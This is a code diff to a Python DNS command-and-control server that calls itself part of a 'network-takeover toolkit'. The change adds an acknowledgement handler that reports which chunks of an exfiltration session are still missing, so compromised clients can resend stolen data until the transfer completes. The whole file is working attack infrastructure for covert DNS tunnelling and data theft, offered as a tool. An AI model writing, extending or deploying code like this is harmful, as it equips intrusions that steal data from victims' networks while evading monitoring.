@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v1.1
+# v1.2
 """
 c2_server.py — DNS C2 server for the network-takeover toolkit.
 
@@ -191,6 +191,31 @@ def _resp_txt(req: DNS, txt: bytes) -> bytes:
                      ar=_opt()))
 
 
+def _resp_ack_status(req: DNS, session_id: str) -> bytes:
+    """
+    Encode session reassembly state into a 4-octet A record.
+
+    Byte layout:  status . received_mod256 . missing_hi . missing_lo
+      status 1 → session complete (or unknown — treat as done)
+      status 0 → first missing chunk at index (missing_hi<<8)|missing_lo
+    """
+    with _session_lock:
+        if session_id not in _sessions:
+            ip = "1.0.0.0"
+        else:
+            sess    = _sessions[session_id]
+            total   = sess["total"]
+            chunks  = sess["chunks"]
+            received = len(chunks)
+            missing  = next((i for i in range(total) if i not in chunks), None)
+            ip = "1.0.0.0" if missing is None else (
+                f"0.{received & 0xFF}.{missing >> 8}.{missing & 0xFF}"
+            )
+    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
+                     an=DNSRR(rrname=req.qd.qname, type="A", ttl=1, rdata=ip),
+                     ar=_opt()))
+
+
 def _resp_nxdomain(req: DNS) -> bytes:
     zone = (DOMAIN + ".").encode()
     return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, rcode=3, qd=req.qd,
@@ -362,6 +387,11 @@ def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
         with _agents_lock:
             known = agent_id in _agents
         reply(_resp_txt(dns, b"ACK" if known else b"NONE"))
+        return
+
+    # ack.<session_id>.<domain> — client queries for missing chunk index
+    if len(sub) == 2 and sub[0] == "ack":
+        reply(_resp_ack_status(dns, sub[1]))
         return
 
     # Data exfiltration chunks
